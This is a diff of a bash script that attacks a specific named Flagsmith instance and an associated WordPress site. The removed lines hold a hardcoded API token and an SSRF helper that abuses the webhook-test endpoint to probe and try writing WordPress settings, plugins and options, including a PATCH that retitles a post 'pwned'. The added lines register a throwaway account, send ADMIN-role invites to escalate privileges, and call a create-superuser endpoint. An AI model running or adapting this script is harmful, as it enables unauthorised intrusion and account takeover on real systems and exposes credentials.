@@ -1,52 +1,56 @@
 #!/bin/bash
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
-EKEY="4kKuh8VekuYPrtpsJFg5mg"
 
-SSRF() {
-  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
+# Register fresh account
+ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
+  -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"email\":\"kw-v26-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
+KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
+echo "Key: $KEY"
+
+if [ -z "$KEY" ]; then
+  KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
+  echo "Fallback"
+fi
+
+# Get our org ID
+ORG=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
+  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10)
+OID=$(echo "$ORG" | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
+echo "Org: $OID"
+
+# If no org, create one
+if [ -z "$OID" ]; then
+  ORG=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
-}
+    -d '{"name":"v26"}' --max-time 10)
+  OID=$(echo "$ORG" | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+  echo "Created Org: $OID"
+fi
 
-echo "IP: $(curl -s https://ifconfig.me)"
+# Test 1: Create invite with ADMIN role (Issue #4681)
+echo "=== ADMIN INVITE ==="
+resp=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/${OID}/invites/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d '{"email":"kw-admin-escalated@proton.me","role":"ADMIN"}' --max-time 15)
+echo "Invite: $resp"
 
-# Test 1: Verify — check if posts endpoint returns our created post
-echo "=== VERIFY POSTS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/posts?per_page=1&orderby=date&order=desc"
+# Test 2: Create invite with role in different format
+echo "=== ADMIN INVITE V2 ==="
+resp2=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/${OID}/invites/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d '{"email":"kw-admin-v2@proton.me","frontend_base_url":"https://flagsmith.koinworks.com","role":"ADMIN"}' --max-time 15)
+echo "Invite v2: $resp2"
+
+# Test 3: Check current role
+echo "=== CURRENT ROLE ==="
+curl -s "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
+  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10
 echo ""
 
-# Test 2: Try to write to WP settings via REST
-echo "=== WRITE SETTINGS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/settings"
-echo ""
-
-# Test 3: Try to create/update themes
-echo "=== THEMES ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/themes"
-echo ""
-
-# Test 4: Try to create/update plugins
-echo "=== PLUGINS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/plugins"
-echo ""
-
-# Test 5: WP REST API search — might confirm post exists
-echo "=== SEARCH ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/search?search=test"
-echo ""
-
-# Test 6: Write to options — might allow arbitrary option modification
-echo "=== OPTIONS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/options"
-echo ""
-
-# Test 7: Try WP REST w/ _method override to send PUT/PATCH
-echo "=== METHOD OVERRIDE ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/posts/1?_method=PATCH&title=pwned"
-echo ""
-
-# Test 8: Try WP REST via rest_route query param (might bypass path-based restrictions)
-echo "=== REST ROUTE SETTINGS ==="
-SSRF "http://koinp2p.com/?rest_route=/wp/v2/settings"
+# Test 4: Try create-superuser with our token (might work after escalation)  
+echo "=== CREATE SUPERUSER ==="
+curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/create-superuser/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d '{"email":"kw-super@proton.me","password":"SuperAdmin2026!X","first_name":"Super","last_name":"Admin"}' --max-time 15
 echo ""
